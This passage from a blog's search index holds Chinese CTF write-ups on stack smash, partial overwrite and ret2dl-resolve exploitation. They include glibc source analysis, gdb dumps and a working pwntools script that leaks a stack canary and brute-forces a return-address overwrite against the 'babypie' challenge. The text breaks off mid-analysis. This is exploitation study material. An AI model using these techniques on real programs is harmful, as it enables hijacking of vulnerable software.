<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>partial overwrite &amp;&amp; stack smash</title>
      <link href="partial-write.html"/>
      <url>partial-write.html</url>
      
        <content type="html"><![CDATA[<p>继续踩partial overwrite和stack smash的坑</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Stack-Smash"><a href="#Stack-Smash" class="headerlink" title="Stack Smash"></a>Stack Smash</h2><p> 在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串,故而我们可以通过覆盖argv[0]的内容来泄露内存中的字符串</p><h2 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h2><p> 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p><p> 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Ubuntu 18.04</li><li>glibc 2.27</li></ul><h1 id="Stack-Smash-1"><a href="#Stack-Smash-1" class="headerlink" title="Stack Smash"></a>Stack Smash</h1><p>这里以2015 年 32C3 CTF readme为例</p><p>在ctf-wiki上给出的exp以及讲解已经很详细了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a> ，我这里主要记录一下坑点</p><p>在我复现exp时，发现无论如何，打印出的信息都是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;*** stack smashing detected ***: &lt;unknown&gt; terminated\n&#39;</span><br></pre></td></tr></table></figure><p>一开始我以为是我的操作错误，但是在调试的过程中，却发现貌似与我的操作无关，而是glibc的行为与ctf-wiki上的有所差别</p><p>于是老样子，我去查看了glbc的源代码，发现了<code>__fortify_fail_abort</code>函数是如下的形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don&#x27;t pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren&#x27;t doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">    <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">    msg,</span><br><span class="line">    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">     ? __libc_argv[<span class="number">0</span>] : <span class="string">&quot;&lt;unknown&gt;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这与ctf-wiki上给出的版本有着很大的区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到多了一个参数，而且在我调试的过程中，第一个参数永远为0<code>xor edi,edi</code>，所以我们来看看上层函数是如何传参的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>__stack_chk_fail</code>函数中直接就指定了<code>need_backtrace</code>为<code>false</code>，故而无论如何修改<code>argv[0]</code>的指针，都不会输出<code>argv[0]</code>指针指向的字符串，而是会一直输出<code>unknown</code></p><p>另一个坑点在于，如果exp的程序在远端，那么类似如下的报错信息是直接输出在远端的<code>tty</code>上而不是<code>stderr</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;*** stack smashing detected ***: xxxxxx terminated\n&#39;</span><br></pre></td></tr></table></figure><p>与这里有关的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">enum</span> __libc_message_action action, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FATAL_PREPARE</span></span><br><span class="line">  FATAL_PREPARE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t call __libc_secure_getenv if we aren&#x27;t doing backtrace, which</span></span><br><span class="line"><span class="comment">     may access the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; do_backtrace))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Open a descriptor for /dev/tty unless the user explicitly</span></span><br><span class="line"><span class="comment"> requests errors on standard error.  */</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *on_2 = __libc_secure_getenv (<span class="string">&quot;LIBC_FATAL_STDERR_&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (on_2 == <span class="literal">NULL</span> || *on_2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fd = __open_nocancel (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fd = STDERR_FILENO;</span><br></pre></td></tr></table></figure><p>可以从代码中看出，如果希望将此报错信息输出至<code>stderr</code>，需要设置环境变量<code>LIBC_FATAL_STDERR_=1</code></p><p>而ctf-wiki上所说的</p><blockquote><p>没有出现无法看见报错信息这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况</p></blockquote><p>实际上就是环境提供者已经设置好了此环境变量</p><p>相关文章:  <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200</a></p><h1 id="Partial-Overwrite-1"><a href="#Partial-Overwrite-1" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h1><p>同样的，记录几个坑点</p><p>这里以安恒杯 2018 年 7 月月赛的 babypie 为例</p><p>ctf-wiki上也讲的比较清楚了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a></p><p>在复现的时候，老问题又出现了，system函数起不来</p><p>于是我尝试调试(16分之一的概率我试了好久…脸是真的黑)</p><p>发现了还是老问题，rsp没有对齐</p><p>不清楚为啥的可以看我写的这篇 <a href="https://ph4ntonn.github.io/bypass-Canary.html">https://ph4ntonn.github.io/bypass-Canary.html</a></p><p>同时注意这里不可以在syscall前对齐，因为system函数校验canary的时候，是如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f9c8d1b81f7 &lt;do_system+679&gt;  mov    rcx, QWORD PTR [rsp+0x178]</span><br><span class="line">0x7f9c8d1b81ff &lt;do_system+687&gt;  xor    rcx, QWORD PTR fs:0x28</span><br></pre></td></tr></table></figure><p>所以必须在call之前就直接对齐</p><p>但是这里我并没有找到很好的办法可以在exp中对齐rsp</p><p>在<code>Ubuntu 16.04</code>，<code>glibc 2.23</code>下可以复现成功</p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;./babypie&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn = process(<span class="string">&quot;./babypie&quot;</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak canary</span></span><br><span class="line">        pwn.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">&#x27;a&#x27;</span> *<span class="number">40</span></span><br><span class="line"></span><br><span class="line">        pwn.sendline(payload)</span><br><span class="line">        pwn.recvuntil(<span class="string">&#x27;a&#x27;</span> *<span class="number">40</span>+<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">        canary = u64(pwn.recvn(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Canary is: &quot;</span>,<span class="built_in">hex</span>(canary)</span><br><span class="line">        old_rbp = u64(pwn.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot; old_rbp is: &quot;</span>, <span class="built_in">hex</span>(old_rbp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># try hijack rip</span></span><br><span class="line">        pwn.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += p64(old_rbp)</span><br><span class="line">        payload += <span class="string">&#x27;\x3e\xfa&#x27;</span> <span class="comment">#try \x3e\x?a</span></span><br><span class="line">        raw_input()</span><br><span class="line">        pwn.send(payload)</span><br><span class="line"></span><br><span class="line">        pwn.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pwn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>成功率看脸～</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl</title>
      <link href="ret2dl.html"/>
      <url>ret2dl.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ret2dl-What"><a href="#Ret2dl-What" class="headerlink" title="Ret2dl?What?"></a>Ret2dl?What?</h1><p>直接贴链接，不再赘述 <a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul><li>Ubuntu 18.04</li><li>glibc 2.27</li></ul><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>首先，我按照 <a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> 中的payload进行了调试，自行调整，一直到stage 4，大体都是ok的，原理也比较清晰易懂，修改的地方也不是很多</p><p>但是，在stage 4时，却一直无法成功，于是我先仔细研究了payload，发现和作者步骤过程基本一致，与ctf-wiki上也是大差不差，但是却一直报非法内存地址访问。</p><p>嘛，那就gdb大法呗～</p><h2 id="确定报错位置"><a href="#确定报错位置" class="headerlink" title="确定报错位置"></a>确定报错位置</h2><p>首先先确定了报错位置</p><p><img src="/image/ret2dl/error.png" alt="error"></p><p>可以看到，此时的edx所指向的内存地址是无法访问的，故而在<code>0xf7fd6fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</code> 尝试取值的过程中，程序崩溃退出</p><p>那么为何在payload几乎相同的情况下，却会发生这种问题呢，带着疑惑，继续向下看</p><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>其实一开始我是以为我哪里写错了，所以浪费了一些时间去校对代码，但是无果</p><p>于是只能用最直接的方法，看看glibc的实现，找到为何会出现这个问题</p><p>报错部分的源代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* This function is called through a special trampoline from the PLT the</span><br><span class="line">   first time each PLT entry is called.  We must perform the relocation</span><br><span class="line">   specified in the PLT of the given shared object, and return the resolved</span><br><span class="line">   function address to the trampoline, which will restart the original call</span><br><span class="line">   to that address.  Future calls will bounce directly from the PLT to the</span><br><span class="line">   function.  *&#x2F;</span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  const ElfW(Sym) *const symtab</span><br><span class="line">    &#x3D; (const void *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  const char *strtab &#x3D; (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  const PLTREL *const reloc</span><br><span class="line">    &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  const ElfW(Sym) *refsym &#x3D; sym;</span><br><span class="line">  void *const rel_addr &#x3D; (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  lookup_t result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Sanity check that we&#39;re really looking at a PLT relocation.  *&#x2F;</span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   &#x2F;* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="line">      used don&#39;t look in the global scope.  *&#x2F;</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) &#x3D;&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">  const ElfW(Half) *vernum &#x3D;</span><br><span class="line">    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">  version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  if (version-&gt;hash &#x3D;&#x3D; 0)</span><br><span class="line">    version &#x3D; NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过比对汇编与源代码，我找到了报错语句为<code>if (version-&gt;hash == 0)</code> ,也就是说在尝试获取<code>version</code>结构体中的<code>hash</code>成员值时出错了</p><p>那这个<code>version</code>又是什么？</p><p>这里要感谢这位师傅的分析，给了我一点启示 <a href="https://forum.90sec.com/t/topic/260">https://forum.90sec.com/t/topic/260</a> </p><p>总的来说，原理大概可以概括为，在<code>_dl_fixup</code>中，需要校验符号的版本(version)，而这个<code>version</code>值是这样取的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure><p>可以看到，ndx作为<code>l_versions</code>成员的下标，其取值与<code>sym</code>的取值十分相似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure><p>其中<code>symtab</code>就是<code>.dynsym</code>节的起始地址，而其中的<code>reloc-&gt;r_info</code>则是我们所控制的值，此值被同时用于<code>version</code>以及<code>sym</code>的取值</p><p>所以也就是说，在我们满足了劫持<code>sym</code>至我们伪造的<code>sym</code>结构体上的同时，我们也必须兼顾<code>version</code>的取值，如果我们所伪造的<code>reloc-&gt;r_info</code>值不恰当，那么就可能导致<code>version</code>取值出现错误</p><p>而这个<code>reloc-&gt;r_info</code>值实际上与我们在exp中向<code>.bss</code>节上写入payload的时候选择的初始偏移有关，故而包括ctf-wiki以及很多网上的payload中所谓的“向<code>bss+0x800</code>偏移处写入payload是为了防止<code>_dl_fixup</code>会引用位置较低的地方”这个解释是不完全正确的，实际上需要在<code>.bss</code>节上加一段偏移主要还是为了保证<code>reloc-&gt;r_info</code>能在一个合理的区间之内，使得<code>sym</code>以及<code>version</code>都能被正确的取值</p><p>而我们所希望的，就是使得<code>version</code>能够取值到<code>null</code>(具体可以详细看上面师傅的文章),为了达到这一点，我们就需要使得<code>ndx</code>的值尽可能为0(因为<code>l-&gt;l_versions[0]</code>一般为<code>null</code>)</p><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>那么，我就来详细分析一下步骤，以及如何尽可能保证<code>ndx</code>的值能够取到0</p><p>首先，在向<code>.bss</code>节上写入payload的时候选择的初始偏移越大，意味着我们所伪造的<code>sym</code>结构体相对于<code>.dynsym</code>节的起始位置的偏移距离也会越大</p><p>这一偏移距离与我们所伪造的<code>reloc-&gt;r_info</code>值息息相关</p><p>而<code>reloc-&gt;r_info</code>值则关系到了<code>ndx</code>的值</p><p>有关<code>ndx</code>取值代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br></pre></td></tr></table></figure><p>对应的汇编代码如下，其中<code>esi</code>的值<code>0x269</code>是我们伪造的<code>reloc-&gt;r_info</code>的值，<code>edx</code>是<code>.gnu.version</code>的起始地址，并且此时选择的<code>.bss</code>的初始偏移距离为<code>0x800</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x080482d8</span><br><span class="line">$esi   : 0x269</span><br><span class="line">......</span><br><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br><span class="line">0xf7f45fde &lt;_dl_fixup+110&gt;  and    edx, 0x7fff</span><br></pre></td></tr></table></figure><p>当上面的代码执行完成后，<code>edx</code>的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x300e   </span><br></pre></td></tr></table></figure><p>此时<code>edx</code>的值实际上就是<code>ndx</code>的值</p><p>当前<code>edx+esi*2</code>的值为<code>0x80487aa</code>，其指向的内存空间布局如下，可以看到<code>0x80487aa</code>处双字节数据即<code>0x300e</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">8048714 00000000 20000000 68000000 d6fdffff  .... ...h.......</span><br><span class="line">8048724 46000000 00410e08 8502420d 05448303  F....A....B..D..</span><br><span class="line">8048734 7ec5c30c 04040000 38000000 8c000000  ~.......8.......</span><br><span class="line">8048744 f8fdffff a7000000 00440c01 00471005  .........D...G..</span><br><span class="line">8048754 02750045 0f037574 06100702 757c1003  .u.E..ut....u|..</span><br><span class="line">8048764 02757802 90c10c01 0041c341 c741c543  .ux......A.A.A.C</span><br><span class="line">8048774 0c040400 48000000 c8000000 70feffff  ....H.......p...</span><br><span class="line">8048784 5d000000 00410e08 8502410e 0c870341  ]....A....A....A</span><br><span class="line">8048794 0e108604 410e1483 054e0e20 690e2441  ....A....N. i.$A</span><br><span class="line">80487a4 0e28440e 2c440e30 4d0e2047 0e1441c3  .(D.,D.0M. G..A.</span><br><span class="line">80487b4 0e1041c6 0e0c41c7 0e0841c5 0e040000  ..A...A...A.....</span><br><span class="line">80487c4 10000000 14010000 84feffff 02000000  ................</span><br><span class="line">80487d4 00000000 00000000               </span><br></pre></td></tr></table></figure><p>此时程序的整体内存空间布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure><p>可以看到<code>0x80487aa</code>落在了下面这页上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br></pre></td></tr></table></figure><p>而我们都知道，内存页未被使用的空间均被<code>0</code>填充</p><p>故而我们可以从上面得到一个信息，从<code>0x80487db</code>-<code>0x08049000</code>这一段区间内，都被0所填充</p><p>那么如果我们可以控制<code>edx+esi*2</code>的值落在这一区间，我们就可以保证<code>ndx</code>的值为0，从而使得<code>version</code>为<code>null</code></p><p>而现在我们的ndx并不是<code>0</code>，所以我们先保留上述观点，继续看下去</p><p>接着执行如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure><p>对应的汇编代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xf7f5e940  →  0x00000000</span><br><span class="line">$edx   : 0x300e0</span><br><span class="line">......</span><br><span class="line">0xf7f45fe4 &lt;_dl_fixup+116&gt;  shl    edx, 0x4</span><br><span class="line">0xf7f45fe7 &lt;_dl_fixup+119&gt;  add    edx, DWORD PTR [eax+0x170]</span><br><span class="line">0xf7f45fed &lt;_dl_fixup+125&gt;  mov    